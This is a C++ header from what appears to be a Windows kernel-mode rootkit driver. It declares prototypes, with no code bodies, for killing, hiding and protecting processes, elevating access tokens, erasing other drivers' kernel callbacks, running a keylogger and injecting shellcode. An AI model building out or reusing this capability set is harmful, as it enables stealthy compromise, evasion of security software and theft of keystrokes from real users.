#pragma once

#include <ntifs.h>
#include <wdf.h>

#include "ProcessUtils.hpp"
#include "DriverMeta.hpp"
#include "Misc.hpp"
#include "WinTypes.hpp"
#include "AddressUtils.hpp"
#include "Vector.hpp"
#include "CallbackUtils.hpp"
#include "AutoLock.hpp"

NTSTATUS BeCmd_KillProcess(_In_ HANDLE pid);
NTSTATUS BeCmd_ProtectProcess(_In_ ULONG pid, _In_ BYTE newProcessProtection);
NTSTATUS BeCmd_ElevateProcessAcessToken(_In_ HANDLE pid);
NTSTATUS BeCmd_KillProcess(_In_ HANDLE pid);
NTSTATUS BeCmd_HideProcess(_In_ HANDLE pid);
ktd::vector<CALLBACK_DATA, PagedPool> BeCmd_EnumerateCallbacks(_In_ CALLBACK_TYPE callbackType);
NTSTATUS BeCmd_EraseCallbacks(_In_ PWCHAR targetDriver, _In_ CALLBACK_TYPE cbType);
NTSTATUS BeCmd_StartKeylogger(_In_ BOOLEAN start);
NTSTATUS BeCmd_InjectionShellcode(_In_ ULONG pid, _In_ PCWSTR filePath);